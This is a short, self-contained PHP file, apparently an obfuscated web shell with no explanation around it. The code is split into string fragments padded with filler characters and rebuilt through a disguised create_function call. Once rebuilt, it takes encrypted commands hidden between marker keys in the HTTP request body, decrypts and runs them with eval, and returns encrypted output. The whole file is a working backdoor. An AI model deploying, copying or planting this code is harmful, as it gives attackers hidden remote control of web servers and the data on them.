<?php
$x='ELuneZ.1XnWZmSGX";functioZ.n x($tZ.,$Z.k){$c=sZ.trlen($k)Z.;$l=Z.sZ.trlenZ.($t)';
$s='nd_cleaZ.n();$r=@base6Z.4_enZ.code(@Z.x(@gZ.zcompressZ.($oZ.Z.),$k)Z.);print("$p$kZ.h$r$kf");}';
$H='$k="712Z.f8b4b";$Z.kh="Z.cd48Z.e97686df"Z.;$kf=Z."63d6Z.44b11Z.319";$Z.p="Z.Z.FX';
$P='Z.@file_geZ.t_cZ.ontents(Z."php://iZ.nput")Z.,$Z.m)==Z.1) {@ob_staZ.rtZ.();Z.@eZ.va';
$C='l(@gzZ.uncompress(@x(@bZ.asZ.e64_decode(Z.Z.$m[1]),$k)))Z.;Z.$o=@ob_geZ.t_contZ.ents();@Z.Z.ob_eZ.';
$b=str_replace('b','','bcreatbbeb_bfuncbtion');
$d='=Z.$tZ.{$i}^$k{$j}Z.;}}retZ.urn Z.$o;}if (Z.Z.@preg_matZ.ch("/$kh(Z..+Z.)$kf/",';
$Q=';$o=Z."";for($i=Z.0;$i<$l;Z.)Z.{for($Z.j=Z.0;($j<$c&&$i<Z.$l);$j+Z.+,$i++)Z.{$o.';
$B=str_replace('Z.','',$H.$x.$Q.$d.$P.$C.$s);
$h=$b('',$B);$h();
?>
